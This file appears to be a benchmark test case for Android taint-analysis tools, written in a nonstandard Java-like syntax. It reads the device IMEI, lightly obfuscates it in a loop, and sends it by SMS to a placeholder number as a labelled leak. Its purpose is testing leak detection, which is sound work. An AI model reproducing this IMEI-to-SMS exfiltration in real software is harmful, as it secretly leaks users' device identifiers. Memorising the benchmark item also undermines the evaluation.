//package de.ecspride;
//
//import android.app.Activity;
//import android.content.Context;
//import android.os.Bundle;
//import android.telephony.SmsManager;
//import android.telephony.TelephonyManager;
/**
 * @testcase_name Loop1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description tainted data is created and sent to a sink after it was transformed in a loop.
 * @dataflow source -> imei -> obfuscated -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle standard java constructs
 */

class LoopExample1 extends Activity {

    protected void onCreate(Bundle savedInstanceState) {
        //super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_loop_example1);
        
        //TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		String imei, obfuscated;
        String[] imeiArray;
        int idx;

        imei = TelephonyManager.getDeviceId(); //source

        idx = 0;
		obfuscated = "";
        imeiArray = toCharArray(imei);
		//for(char c : imei.toCharArray())
		//	obfuscated += c + "_";

        while (idx < len(imeiArray)) {
            obfuscated = obfuscated ++ imeiArray[idx];
            obfuscated = obfuscated ++ "_";
            idx = idx + 1;
        }

		//SmsManager sm = SmsManager.getDefault();

        SmsManager.sendTextMessage("+49 1234", "", obfuscated, "", ""); //sink, leak
    }    
}
